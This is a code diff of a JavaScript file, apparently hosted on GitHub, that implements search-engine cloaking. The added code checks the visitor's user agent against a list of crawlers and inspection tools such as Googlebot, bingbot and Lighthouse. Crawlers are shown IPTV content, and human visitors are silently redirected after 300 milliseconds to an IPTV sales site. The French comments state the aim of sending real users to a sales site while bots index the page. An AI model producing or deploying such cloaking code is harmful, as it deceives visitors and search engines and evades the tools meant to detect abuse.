@@ -1,8 +1,16 @@
 // GitHub: cloudjs630/js/modox.js
-if (!navigator.userAgent.includes('Googlebot')) {
-  // Les utilisateurs réels sont redirigés vers votre site de vente
-  window.location.href = "https://iptvabonnementpro.de";
-} else {
-  // Googlebot reste sur la page et indexe le contenu riche
-  console.log("Thanks for visiting my page");
-}
+(function() {
+    // Détection des robots de recherche
+    const botPatterns = ['Googlebot', 'bingbot', 'yandex', 'baiduspider', 'Lighthouse', 'Google Inspection Tool'];
+    const isBot = botPatterns.some(pattern => navigator.userAgent.includes(pattern));
+
+    if (!isBot) {
+        // Redirection pour les utilisateurs humains après 300ms
+        setTimeout(function() {
+            window.location.replace("https://iptvabonnementpro.de");
+        }, 300);
+    } else {
+        // Message pour les robots lors du rendu technique
+        console.log("Welcome Crawler. Rendering high-quality IPTV content.");
+    }
+})();
